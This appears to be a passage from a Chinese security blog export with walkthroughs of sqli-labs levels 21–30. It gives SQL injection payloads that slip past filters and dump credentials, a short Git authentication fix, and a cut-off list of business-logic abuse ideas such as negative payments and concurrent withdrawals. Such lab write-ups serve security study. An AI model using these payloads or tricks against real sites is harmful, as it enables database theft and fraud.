&#x2F;<em>%0a</em>&#x2F;where&#x2F;<em>%0a</em>&#x2F; table_schema&#x3D;’security’ &#x2F;<em>%0a</em>&#x2F;limit&#x2F;<em>%0a</em>&#x2F;0,1),1,1)&#x3D;’e’&#x2F;<em>%0a</em>&#x2F;||”</p><h2 id="4、获取字段信息-1"><a href="#4、获取字段信息-1" class="headerlink" title="4、获取字段信息"></a>4、获取字段信息</h2><p>?id&#x3D;1”&#x2F;<em>%0a</em>&#x2F; and&#x2F;<em>%0a</em>&#x2F; substr((sEleCt &#x2F;<em>%0a</em>&#x2F;column_name &#x2F;<em>%0a</em>&#x2F;from &#x2F;<em>%0a</em>&#x2F;information_schema.columns &#x2F;<em>%0a</em>&#x2F;where&#x2F;<em>%0a</em>&#x2F; table_schema&#x3D;’security’ &#x2F;<em>%0a</em>&#x2F;and &#x2F;<em>%0a</em>&#x2F;table_name&#x3D;’users’ &#x2F;<em>%0a</em>&#x2F;limit&#x2F;<em>%0a</em>&#x2F;0,1),1,1)&#x3D;’i’||”</p><h2 id="5、获取数据值"><a href="#5、获取数据值" class="headerlink" title="5、获取数据值"></a>5、获取数据值</h2><p>?id&#x3D;1” &#x2F;<em>%0a</em>&#x2F;and &#x2F;<em>%0a</em>&#x2F;substr((sEleCt&#x2F;<em>%0a</em>&#x2F; concat_ws(‘,’,username,password)&#x2F;<em>%0a</em>&#x2F; from &#x2F;<em>%0a</em>&#x2F;security.users &#x2F;<em>%0a</em>&#x2F;limit&#x2F;<em>%0a</em>&#x2F; 0,1),1,1)&#x3D;’D’||”</p><h1 id="六、less28"><a href="#六、less28" class="headerlink" title="六、less28"></a>六、less28</h1><h2 id="1、判断注入-4"><a href="#1、判断注入-4" class="headerlink" title="1、判断注入"></a>1、判断注入</h2><p>过滤了union select和注释符和空格</p><h2 id="2、判断字段数"><a href="#2、判断字段数" class="headerlink" title="2、判断字段数"></a>2、判断字段数</h2><p>?id&#x3D;1’)&#x2F;<em>%0A</em>&#x2F;order&#x2F;<em>%0A</em>&#x2F;by&#x2F;<em>%0A</em>&#x2F;3||(‘ </p><h2 id="3、判断回显点"><a href="#3、判断回显点" class="headerlink" title="3、判断回显点"></a>3、判断回显点</h2><p>?id&#x3D;1’)&#x2F;<em>%0A</em>&#x2F;and&#x2F;<em>%0A</em>&#x2F;1&#x3D;2&#x2F;<em>%0A</em>&#x2F;UnIOn&#x2F;<em>%0A</em>&#x2F;all&#x2F;<em>%0A</em>&#x2F;SeLEct&#x2F;<em>%0A</em>&#x2F;1,2,3||(‘</p><h2 id="4、获取数据库信息"><a href="#4、获取数据库信息" class="headerlink" title="4、获取数据库信息"></a>4、获取数据库信息</h2><p>?id&#x3D;1’)&#x2F;<em>%0A</em>&#x2F;and&#x2F;<em>%0A</em>&#x2F;1&#x3D;2&#x2F;<em>%0A</em>&#x2F;UnIOn&#x2F;<em>%0A</em>&#x2F;ALL&#x2F;<em>%0A</em>&#x2F;SeLEct&#x2F;<em>%0A</em>&#x2F;1,database(),3&#x2F;<em>%0A</em>&#x2F;||(‘</p><h2 id="5、获取表信息"><a href="#5、获取表信息" class="headerlink" title="5、获取表信息"></a>5、获取表信息</h2><p>id&#x3D;1’)&#x2F;<em>%0A</em>&#x2F;and&#x2F;<em>%0A</em>&#x2F;1&#x3D;2&#x2F;<em>%0A</em>&#x2F;UnIOn&#x2F;<em>%0A</em>&#x2F;ALL&#x2F;<em>%0A</em>&#x2F;SeLEct&#x2F;<em>%0A</em>&#x2F;1,group_concat(table_name),3&#x2F;<em>%0A</em>&#x2F;from&#x2F;<em>%0A</em>&#x2F;information_schema.tables&#x2F;<em>%0A</em>&#x2F;where&#x2F;<em>%0A</em>&#x2F;table_schema&#x3D;’security’&#x2F;<em>%0A</em>&#x2F;||(‘</p><h2 id="6、获取字段信息"><a href="#6、获取字段信息" class="headerlink" title="6、获取字段信息"></a>6、获取字段信息</h2><pre><code>id=1&#39;)/*%0A*/and/*%0A*/1=2/*%0A*/UnIOn/*%0A*/ALL/*%0A*/SeLEct/*%0A*/1,group_concat(column_name),3/*%0A*/from/*%0A*/information_schema.columns/*%0A*/where/*%0A*/table_schema=&#39;security&#39;and/*%0A*/table_name=&#39;users&#39;/*%0A*/||(&#39;</code></pre><h2 id="7、获取值"><a href="#7、获取值" class="headerlink" title="7、获取值"></a>7、获取值</h2><p>?id&#x3D;1’)&#x2F;<em>%0A</em>&#x2F;and&#x2F;<em>%0A</em>&#x2F;1&#x3D;2&#x2F;<em>%0A</em>&#x2F;UnIoN&#x2F;<em>%0A</em>&#x2F;all&#x2F;<em>%0A</em>&#x2F;SeLeCt&#x2F;<em>%0A</em>&#x2F;1,(SeLeCt&#x2F;<em>%0A</em>&#x2F;group_concat(concat_ws(‘$’,id,username,password))&#x2F;<em>%0A</em>&#x2F;from&#x2F;<em>%0A</em>&#x2F;users),3&#x2F;<em>%0A</em>&#x2F;||(‘</p><h1 id="七、less28a"><a href="#七、less28a" class="headerlink" title="七、less28a"></a>七、less28a</h1><h2 id="1、判断注入-5"><a href="#1、判断注入-5" class="headerlink" title="1、判断注入"></a>1、判断注入</h2><p>基于联合查询的字符型注入，过滤了union select注释符和空格，与上一关差不多</p><h2 id="2、判断回显点"><a href="#2、判断回显点" class="headerlink" title="2、判断回显点"></a>2、判断回显点</h2><p>?id&#x3D;1’)&#x2F;<em>%0A</em>&#x2F;and&#x2F;<em>%0A</em>&#x2F;1&#x3D;2&#x2F;<em>%0A</em>&#x2F;unIon&#x2F;<em>%0A</em>&#x2F;sElect&#x2F;<em>%0A</em>&#x2F;1,2,3||(‘<br><img src="http://120.48.107.243:9090/blog/2023/04/03/59edf3e0613f4ed1a1f1dde6e6cee0ee.png" alt="在这里插入图片描述"></p><h2 id="3、获取数据库信息"><a href="#3、获取数据库信息" class="headerlink" title="3、获取数据库信息"></a>3、获取数据库信息</h2><p>?id&#x3D;1’)&#x2F;<em>%0A</em>&#x2F;and&#x2F;<em>%0A</em>&#x2F;1&#x3D;2&#x2F;<em>%0A</em>&#x2F;unIon&#x2F;<em>%0A</em>&#x2F;sElect&#x2F;<em>%0A</em>&#x2F;1,database(),3||(‘<br><img src="http://120.48.107.243:9090/blog/2023/04/03/9ecae5f020df4d03a2ddb23e7fd0037b.png" alt="在这里插入图片描述"></p><h2 id="4、获取表信息"><a href="#4、获取表信息" class="headerlink" title="4、获取表信息"></a>4、获取表信息</h2><p>?id&#x3D;1’)&#x2F;<em>%0A</em>&#x2F;and&#x2F;<em>%0A</em>&#x2F;1&#x3D;2&#x2F;<em>%0A</em>&#x2F;unIon&#x2F;<em>%0A</em>&#x2F;sElect&#x2F;<em>%0A</em>&#x2F;1,group_concat(table_name),3&#x2F;<em>%0A</em>&#x2F;from&#x2F;<em>%0A</em>&#x2F;information_schema.tables&#x2F;<em>%0A</em>&#x2F;where&#x2F;<em>%0A</em>&#x2F;table_schema&#x3D;’security’&#x2F;<em>%0A</em>&#x2F;||(‘<br><img src="http://120.48.107.243:9090/blog/2023/04/03/64cd5fbad2ca442daffa549d4456d94e-20230403143010908.png" alt="在这里插入图片描述"></p><h2 id="5、获取字段信息"><a href="#5、获取字段信息" class="headerlink" title="5、获取字段信息"></a>5、获取字段信息</h2><p>?id&#x3D;1’)&#x2F;<em>%0A</em>&#x2F;and&#x2F;<em>%0A</em>&#x2F;1&#x3D;2&#x2F;<em>%0A</em>&#x2F;unIon&#x2F;<em>%0A</em>&#x2F;sElect&#x2F;<em>%0A</em>&#x2F;1,group_concat(column_name),3&#x2F;<em>%0A</em>&#x2F;from&#x2F;<em>%0A</em>&#x2F;information_schema.columns&#x2F;<em>%0A</em>&#x2F;where&#x2F;<em>%0A</em>&#x2F;table_schema&#x3D;’security’&#x2F;<em>%0A</em>&#x2F;and&#x2F;<em>%0A</em>&#x2F;table_name&#x3D;’users’&#x2F;<em>%0A</em>&#x2F;||(‘<br><img src="http://120.48.107.243:9090/blog/2023/04/03/b23d8ad2d4a34e90aa5f353e690570ea.png" alt="在这里插入图片描述"></p><h2 id="6、获取用户名密码"><a href="#6、获取用户名密码" class="headerlink" title="6、获取用户名密码"></a>6、获取用户名密码</h2><p>&#x2F;?id&#x3D;1’)&#x2F;<em>%0A</em>&#x2F;and&#x2F;<em>%0A</em>&#x2F;1&#x3D;2&#x2F;<em>%0A</em>&#x2F;UnIoN&#x2F;<em>%0A</em>&#x2F;SeLeCt&#x2F;<em>%0A</em>&#x2F;1,(SeLeCt&#x2F;<em>%0A</em>&#x2F;group_concat(concat_ws(‘$’,id,username,password))&#x2F;<em>%0A</em>&#x2F;from&#x2F;<em>%0A</em>&#x2F;users),3&#x2F;<em>%0A</em>&#x2F;||(‘</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/dd17b46edf6641f9a48d491ddbdfc8aa.png" alt="在这里插入图片描述"></p><h1 id="八、less29"><a href="#八、less29" class="headerlink" title="八、less29"></a>八、less29</h1><h2 id="1、判断注入-6"><a href="#1、判断注入-6" class="headerlink" title="1、判断注入"></a>1、判断注入</h2><p>这一关使用报错注入。</p><h2 id="2、获取数据库信息-4"><a href="#2、获取数据库信息-4" class="headerlink" title="2、获取数据库信息"></a>2、获取数据库信息</h2><p>?id&#x3D;1’ and extractvalue(1,concat(‘~’,database()))–+<br><img src="http://120.48.107.243:9090/blog/2023/04/03/9e766755d75e4a16a093eda0a1ef78d3.png" alt="在这里插入图片描述"></p><h2 id="3、获取表信息-4"><a href="#3、获取表信息-4" class="headerlink" title="3、获取表信息"></a>3、获取表信息</h2><p>?id&#x3D;1’ and extractvalue(1,concat(‘~’,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’)))–+<br><img src="http://120.48.107.243:9090/blog/2023/04/03/eb34410cc1044ace88d08a8fa86833f6.png" alt="在这里插入图片描述"></p><h2 id="4、获取字段信息-2"><a href="#4、获取字段信息-2" class="headerlink" title="4、获取字段信息"></a>4、获取字段信息</h2><p><a href="http://sql/Less-29/?id=1&#39;">http://sql/Less-29/?id=1&#39;</a> and extractvalue(1,concat(‘~’,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’)))–+<br><img src="http://120.48.107.243:9090/blog/2023/04/03/0c3c541c68f74854a7c3ad276095d055.png" alt="在这里插入图片描述"></p><h2 id="5、获取详细信息"><a href="#5、获取详细信息" class="headerlink" title="5、获取详细信息"></a>5、获取详细信息</h2><p>?id&#x3D;1’ and extractvalue(1,concat(‘~’,(select concat_ws(‘,’,id,username,password) from security.users limit 0,1)))–+<br><img src="http://120.48.107.243:9090/blog/2023/04/03/9a945c26688248f29df2d0e155911c71.png" alt="在这里插入图片描述"></p><h1 id="九、less30"><a href="#九、less30" class="headerlink" title="九、less30"></a>九、less30</h1><h2 id="1、判断注入-7"><a href="#1、判断注入-7" class="headerlink" title="1、判断注入"></a>1、判断注入</h2><p>闭合字符为”，使用联合查询</p><h2 id="2、判断字段数-1"><a href="#2、判断字段数-1" class="headerlink" title="2、判断字段数"></a>2、判断字段数</h2><p><a href="http://sql/Less-30/?id=1&quot;">http://sql/Less-30/?id=1&quot;</a> order by 3–+<br><img src="http://120.48.107.243:9090/blog/2023/04/03/31ca16da146f40eebb75e358baa9fbc5.png" alt="在这里插入图片描述"></p><h2 id="3、判断回显点-1"><a href="#3、判断回显点-1" class="headerlink" title="3、判断回显点"></a>3、判断回显点</h2><p><a href="http://sql/Less-30/?id=-1&quot;">http://sql/Less-30/?id=-1&quot;</a> union select 1,2,3–+<br><img src="http://120.48.107.243:9090/blog/2023/04/03/d3dd02fe605d4675afa537f23ac0b3ae.png" alt="在这里插入图片描述"></p><h2 id="4、获取数据库信息-1"><a href="#4、获取数据库信息-1" class="headerlink" title="4、获取数据库信息"></a>4、获取数据库信息</h2><p><a href="http://sql/Less-30/?id=-1&quot;">http://sql/Less-30/?id=-1&quot;</a> union select 1,2,database()–+<br><img src="http://120.48.107.243:9090/blog/2023/04/03/9cfae011c8b44f858bdaf4827ceb484c.png" alt="在这里插入图片描述"></p><h2 id="5、获取表信息-1"><a href="#5、获取表信息-1" class="headerlink" title="5、获取表信息"></a>5、获取表信息</h2><p><a href="http://sql/Less-30/?id=-1&quot;union">http://sql/Less-30/?id=-1&quot;union</a> select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;’security’–+<br><img src="http://120.48.107.243:9090/blog/2023/04/03/c07ebac42aa641cdb93303fa3c908158.png" alt="在这里插入图片描述"></p><h2 id="6、获取字段信息-1"><a href="#6、获取字段信息-1" class="headerlink" title="6、获取字段信息"></a>6、获取字段信息</h2><p><a href="http://sql/Less-30/?id=-1&quot;union">http://sql/Less-30/?id=-1&quot;union</a> select 1,2,group_concat(column_name)from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’–+<br><img src="http://120.48.107.243:9090/blog/2023/04/03/9280ae3cdda3401cb9c71d42bb438409.png" alt="在这里插入图片描述"></p><h2 id="7、获取用户名密码"><a href="#7、获取用户名密码" class="headerlink" title="7、获取用户名密码"></a>7、获取用户名密码</h2><p><a href="http://sql/Less-30/?id=-1&quot;union">http://sql/Less-30/?id=-1&quot;union</a> select 1,2,concat_ws(‘,’,id,username,password)from security.users limit 0,1–+<br><img src="http://120.48.107.243:9090/blog/2023/04/03/b67ed2a1317e4929849fbd0c9258ebae.png" alt="在这里插入图片描述"></p><h1 id="十、总结与后记"><a href="#十、总结与后记" class="headerlink" title="十、总结与后记"></a>十、总结与后记</h1><p>本篇文章是sql-lib的26关-30关，有问题请留言，万分感谢，本篇较难，参考了<a href="https://blog.csdn.net/m0_64361111/article/details/123570434%E8%BF%99%E7%AF%87%E6%96%87%E6%A1%A3%EF%BC%8C%E4%B8%87%E5%88%86%E6%84%9F%E8%B0%A2%E3%80%82">https://blog.csdn.net/m0_64361111/article/details/123570434这篇文档，万分感谢。</a></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 打靶记录 </category>
          
          <category> SQL注入靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 打靶记录 </tag>
            
            <tag> SQL注入靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git推送本地到库鉴权失败</title>
      <link href="/2022/10/13/git_push_error/"/>
      <url>/2022/10/13/git_push_error/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/434f828d4aea4cb293afbbe3155dd0d1-20230403131115910.png" alt="在这里插入图片描述"></p><h1 id="一、记录"><a href="#一、记录" class="headerlink" title="一、记录"></a>一、记录</h1><p>在学习git的时候，从本地仓库推送到远程的时候，出现了上图提示，刚开始没细看，以为是账号密码错误，输了好多次还是这样，我才定睛一看，原来是在2021年8月13日移除了密码认证，请登录该网址查看详细内容。<br>在网上找了找，大概就是需要加一个个人的token，而且设置期限。</p><h1 id="二、解决"><a href="#二、解决" class="headerlink" title="二、解决"></a>二、解决</h1><h2 id="1、登录github，找到个人设置："><a href="#1、登录github，找到个人设置：" class="headerlink" title="1、登录github，找到个人设置："></a>1、登录github，找到个人设置：</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/52b04a8cc86f40b793341be11c43608c.png" alt="在这里插入图片描述"><br>翻到最下面，找到开发者设置：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/938a3f7886304cafbe7398a2c7c327d6.png" alt="在这里插入图片描述"><br>进入后，选择个人token，然后生成一个新的token：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/093571e0c6f741e5a8155279b1536bae.png" alt="在这里插入图片描述"><br>验证密码后，进入这个页面，填好需要填的：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/7a8c9b87f668427f9cccbaa0c35118a4.png" alt="在这里插入图片描述"><br>然后就会生成一个token：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/597d690bec774f20894d4d971a22f4e7.png" alt="在这里插入图片描述"><br>复制好，建议保存，然后git的时候，提示输入用户名和密码，用户名还是你的用户名，密码填这个，然后就发现推送成功了。<br>如果提示：远程仓库包含您本地尚不存在的提交。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/fd4265c8ccb3432d9db6f7481ddc8efb.png" alt="在这里插入图片描述"></p><p>第一种方法：强制推送<br>强制上传输入命令： git push -u origin +master<br>第二种方法：先同步远程到本地，然后再推送：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git fetch origin https://github.com/threeshui/SomePoc.git</span><br><span class="line">git merge origin/master //获取远程更新</span><br><span class="line">git push origin master  //把更新的内容合并到本地分支</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/f37bb169277b4ae0970be5c8db7544f5.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/be42a9a71d8a4339a322955b13bd43a6.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 答疑 </category>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 答疑 </tag>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入靶场（五）</title>
      <link href="/2022/10/02/sql_lab_five/"/>
      <url>/2022/10/02/sql_lab_five/</url>
      
        <content type="html"><![CDATA[<h1 id="一、实操环境"><a href="#一、实操环境" class="headerlink" title="一、实操环境"></a>一、实操环境</h1><h2 id="1、操作系统"><a href="#1、操作系统" class="headerlink" title="1、操作系统"></a>1、操作系统</h2><ol><li>VMware虚拟机创建的win10系统</li><li>内存8GB</li><li>硬盘255GB</li><li>处理器AMD Ryzen 9 5900HX</li></ol><h2 id="2、操作项目"><a href="#2、操作项目" class="headerlink" title="2、操作项目"></a>2、操作项目</h2><p><strong>sql-lib项目，本篇文章介绍关卡21-25。</strong></p><h2 id="3、工具版本"><a href="#3、工具版本" class="headerlink" title="3、工具版本"></a>3、工具版本</h2><ol><li><p>phpstudy 8.1.1.3</p></li><li><p>php版本 5.4.45nts</p></li><li><p>Apache2.4.39</p></li><li><p>MySQL5.7.26</p></li><li><p>Chrome</p></li></ol><h2 id="4、SQL注入目的"><a href="#4、SQL注入目的" class="headerlink" title="4、SQL注入目的"></a>4、SQL注入目的</h2><ol><li>判断是否允许注入</li><li>判断注入点类型</li><li>判断回显点</li><li>获取数据库信息</li><li>获取表信息 </li><li>获取字段信息</li></ol><h1 id="二、less21"><a href="#二、less21" class="headerlink" title="二、less21"></a>二、less21</h1><h2 id="1、判断注入"><a href="#1、判断注入" class="headerlink" title="1、判断注入"></a>1、判断注入</h2><p>这一关也是cookie注入，但是需要将语句进行base64编码。</p><h2 id="2、获取数据库信息"><a href="#2、获取数据库信息" class="headerlink" title="2、获取数据库信息"></a>2、获取数据库信息</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/3fd55b9dcb16420bbc8c2fef4407361c.png" alt="在这里插入图片描述"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/818cb0160ff544c7a25464281e4fa458.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/8f0f7ed5b60b4f6d9e36318ab772bf43.png" alt="在这里插入图片描述"></p><h2 id="3、获取用户名密码"><a href="#3、获取用户名密码" class="headerlink" title="3、获取用户名密码"></a>3、获取用户名密码</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/3699b02ad17148d79747ea27efdb51ae.png" alt="在这里插入图片描述"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/f26d47517bc9405e91ed61d17a76e943.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/3434aae2b4934bacadc54bb81e17775e.png" alt="在这里插入图片描述"></p><h1 id="三、less22"><a href="#三、less22" class="headerlink" title="三、less22"></a>三、less22</h1><h2 id="1、判断注入-1"><a href="#1、判断注入-1" class="headerlink" title="1、判断注入"></a>1、判断注入</h2><p>闭合变成了双引号，其余和上一关一样。</p><h2 id="2、直接爆破用户名和密码"><a href="#2、直接爆破用户名和密码" class="headerlink" title="2、直接爆破用户名和密码"></a>2、直接爆破用户名和密码</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/e1c50bf9a38c476c8bfd7aa6eeed5f06.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/d79f3141de3b44589946d7ca38bd1255.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/1f1b210f6f994cf5ae17329e16629171.png" alt="在这里插入图片描述"></p><h1 id="四、less23"><a href="#四、less23" class="headerlink" title="四、less23"></a>四、less23</h1><h2 id="1、判断注入-2"><a href="#1、判断注入-2" class="headerlink" title="1、判断注入"></a>1、判断注入</h2><p>这一关过滤了注释符号，不看php文件会感觉无从下手，查看源代码发现吧# –+注释符号给过滤掉了，这里使用’。</p><h2 id="2、获取数据库信息-1"><a href="#2、获取数据库信息-1" class="headerlink" title="2、获取数据库信息"></a>2、获取数据库信息</h2><p>输入<a href="http://sql/Less-23/?id=&#39;">http://sql/Less-23/?id=&#39;</a> union select 1,13,database() ‘<br><img src="http://120.48.107.243:9090/blog/2023/04/03/58912c6f77af40e7b2c6234a98235a12.png" alt="在这里插入图片描述"></p><h2 id="3、获取表信息"><a href="#3、获取表信息" class="headerlink" title="3、获取表信息"></a>3、获取表信息</h2><p>输入<a href="http://sql/Less-23/?id=&#39;">http://sql/Less-23/?id=&#39;</a> union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() or ‘1’&#x3D;’<br><img src="http://120.48.107.243:9090/blog/2023/04/03/1211e6119b3f4f8d8044219eaf25e38f.png" alt="在这里插入图片描述"></p><h2 id="4、获取列信息"><a href="#4、获取列信息" class="headerlink" title="4、获取列信息"></a>4、获取列信息</h2><p><a href="http://sql/Less-23/?id=&#39;">http://sql/Less-23/?id=&#39;</a> union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ or ‘1’&#x3D;’<br><img src="http://120.48.107.243:9090/blog/2023/04/03/0c3d5072fc5a4ad5892be72c50a37f52.png" alt="在这里插入图片描述"></p><h2 id="5、获取用户名密码"><a href="#5、获取用户名密码" class="headerlink" title="5、获取用户名密码"></a>5、获取用户名密码</h2><p><a href="http://sql/Less-23/?id=&#39;">http://sql/Less-23/?id=&#39;</a> union select 1,group_concat(username),group_concat(password) from users where 1 or ‘1’&#x3D;’<br><img src="http://120.48.107.243:9090/blog/2023/04/03/04234b6be65f414ca445ea45df1ebd87.png" alt="在这里插入图片描述"></p><h1 id="五、less24"><a href="#五、less24" class="headerlink" title="五、less24"></a>五、less24</h1><h2 id="1、注入判断"><a href="#1、注入判断" class="headerlink" title="1、注入判断"></a>1、注入判断</h2><p>这是简单的二次注入，没有过滤，可以先注册一个admin’#账号，在修改密码的时候我们可以用自己的密码修改admin的密码。</p><h2 id="2、注册登录"><a href="#2、注册登录" class="headerlink" title="2、注册登录"></a>2、注册登录</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/abcac8099f08418784db3a34961d972c.png" alt="在这里插入图片描述"></p><h2 id="3、登录后修改密码"><a href="#3、登录后修改密码" class="headerlink" title="3、登录后修改密码"></a>3、登录后修改密码</h2><p>这里实际上是将admin的密码改掉了。</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/84d3e8e4b1cd4e7a8f809dd2c0e2b2f6.png" alt="在这里插入图片描述"></p><h2 id="4、使用修改后的密码登录"><a href="#4、使用修改后的密码登录" class="headerlink" title="4、使用修改后的密码登录"></a>4、使用修改后的密码登录</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/394655d130ec4603991bf1efcb439386.png" alt="在这里插入图片描述"></p><h1 id="六、less25"><a href="#六、less25" class="headerlink" title="六、less25"></a>六、less25</h1><h2 id="1、判断注入-3"><a href="#1、判断注入-3" class="headerlink" title="1、判断注入"></a>1、判断注入</h2><p>这一关过滤了and和or，有两个方法，第一个是使用–+或者#，第二个是双写。</p><h2 id="2、获取数据库信息-2"><a href="#2、获取数据库信息-2" class="headerlink" title="2、获取数据库信息"></a>2、获取数据库信息</h2><p><a href="http://sql/Less-25/?id=-1&#39;">http://sql/Less-25/?id=-1&#39;</a> union select 1,13,database()–+<br><img src="http://120.48.107.243:9090/blog/2023/04/03/af2a1ca9c2cf4c54a3b78b7758b9874c.png" alt="在这里插入图片描述"></p><h2 id="3、获取用户名密码-1"><a href="#3、获取用户名密码-1" class="headerlink" title="3、获取用户名密码"></a>3、获取用户名密码</h2><p><a href="http://sql/Less-25/?id=-1&#39;">http://sql/Less-25/?id=-1&#39;</a> union select 1,2,group_concat(username,0x7e,passwoorrd) from users–+<br><img src="http://120.48.107.243:9090/blog/2023/04/03/7b38871df408427ca60b3dfd0601ea3c.png" alt="在这里插入图片描述"></p><h1 id="七、less25a"><a href="#七、less25a" class="headerlink" title="七、less25a"></a>七、less25a</h1><p>这一关和25一样，把单引号去掉即可。</p><h2 id="1、获取数据库信息"><a href="#1、获取数据库信息" class="headerlink" title="1、获取数据库信息"></a>1、获取数据库信息</h2><p><a href="http://sql/Less-25a/?id=-1">http://sql/Less-25a/?id=-1</a> union select 1,13,database()–+<br><img src="http://120.48.107.243:9090/blog/2023/04/03/54d496b02c324c7db9d180637db6ed38.png" alt="在这里插入图片描述"></p><h2 id="2、获取用户名密码"><a href="#2、获取用户名密码" class="headerlink" title="2、获取用户名密码"></a>2、获取用户名密码</h2><p><a href="http://sql/Less-25a/?id=-1">http://sql/Less-25a/?id=-1</a> union select 1,2,group_concat(username,0x7e,passwoorrd) from users–+<br><img src="http://120.48.107.243:9090/blog/2023/04/03/627b9657b958464f8010ba95226e530e.png" alt="在这里插入图片描述"></p><h1 id="八、总结与后记"><a href="#八、总结与后记" class="headerlink" title="八、总结与后记"></a>八、总结与后记</h1><p>本篇文章为sql-lib第21关到第25关a，有问题请留言，万分感谢。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 打靶记录 </category>
          
          <category> SQL注入靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 打靶记录 </tag>
            
            <tag> SQL注入靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>业务逻辑漏洞的学习</title>
      <link href="/2022/09/14/Business_logic/"/>
      <url>/2022/09/14/Business_logic/</url>
      
        <content type="html"><![CDATA[<p><strong>声明：只是用于学习交流，笔记记录，不可用作违规用途。</strong></p><h1 id="一、业务逻辑漏洞简介"><a href="#一、业务逻辑漏洞简介" class="headerlink" title="一、业务逻辑漏洞简介"></a>一、业务逻辑漏洞简介</h1><p>简单理解：就是编程人员的思维逻辑不够严谨导致攻击者有机可乘的漏洞。<br>逻辑漏洞还是一种虽然没有在owasp top10中提及到，但是往往会存在的漏洞，并且在hvv，渗透测试中广泛存在，造成的破坏可能一点不比sql注入，xss等漏洞小，如下是逻辑漏洞的top10挖掘方向。</p><h1 id="二、常见的逻辑漏洞"><a href="#二、常见的逻辑漏洞" class="headerlink" title="二、常见的逻辑漏洞"></a>二、常见的逻辑漏洞</h1><p>交易支付、密码修改、密码找回、越权修改、越权查询、突破限制等各类逻辑漏洞，逻辑漏洞很多时候都需要脑洞大开。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/f148cca026ea4270b61421b94cc7d176.png" alt="在这里插入图片描述"></p><h1 id="三、场景"><a href="#三、场景" class="headerlink" title="三、场景"></a>三、场景</h1><h2 id="1、饮料贩卖机"><a href="#1、饮料贩卖机" class="headerlink" title="1、饮料贩卖机"></a>1、饮料贩卖机</h2><ol><li>替换订单ID，创建订单时在支付界面，在此创建订单替换订单ID（高价替换低价）</li><li>无限新用户优惠订单，重复创建优惠订单</li><li>替换优惠券ID（未达到条件使用）</li><li>个别情况订单数量为1.99时，客户端只支付1元，实际上服务器认为支付了2元。</li><li>取货时并发</li></ol><h2 id="2、直播"><a href="#2、直播" class="headerlink" title="2、直播"></a>2、直播</h2><ol><li>快速进出房间炸房</li><li>无限发送点赞协议</li><li>修改礼物数量，0，小数，负数，特定值（一般情况下为1073741824）</li><li>修改礼物ID，遍历尝试是否有隐藏ID。</li><li>并发送礼物，抽奖</li><li>无限创建首次优惠订单，有些首次优惠订单是一个特殊的pid，这种直接替换pid进行支付，有些是相同的ID，这种的提前创建订单，记录多个订单号在依次修改订单支付。</li><li>刷屏：发言刷屏，分享，点赞等有提示的地方刷屏。</li><li>房间内可以申请的地方进行申请取消操作，看看是否能炸房。</li><li>越权踢人，增加管理员，关闭房间等操作。</li><li>发送的表情是否可以修改长宽</li></ol><h2 id="3、购物APP"><a href="#3、购物APP" class="headerlink" title="3、购物APP"></a>3、购物APP</h2><ol><li>购买数量：为0，小数，负数，正负值</li><li>代金券：并发领取，遍历领取，同一个代金券重复使用，未满足条件使用代金券</li><li>越权：登录，操作别人订单，修改资料</li></ol><h2 id="4、外卖"><a href="#4、外卖" class="headerlink" title="4、外卖"></a>4、外卖</h2><ol><li>商品数量，0，负数，小数，特定值，正负数</li><li>送餐员评价修改，星级，打赏金额</li><li>订单超出送餐地址</li><li>强行货到付款，取消订单，退款</li><li>越权操作别人订单，登录</li><li>优惠购买会员（重复使用优惠购买）</li></ol><h2 id="5、交易平台"><a href="#5、交易平台" class="headerlink" title="5、交易平台"></a>5、交易平台</h2><ol><li>钱包并发提现，负数提现</li><li>使用钱包支付时多个订单并发支付（是否支付金额能大于余额）</li><li>转账负数，并发转账</li><li>上架商品突破限制，例如数量，字数</li><li>替换订单，创建订单号如果订单状态可修改，先进到支付界面，然后将订单修改成更大的金额，然后支付提前进入的支付界面。</li><li>数量修改</li></ol><h2 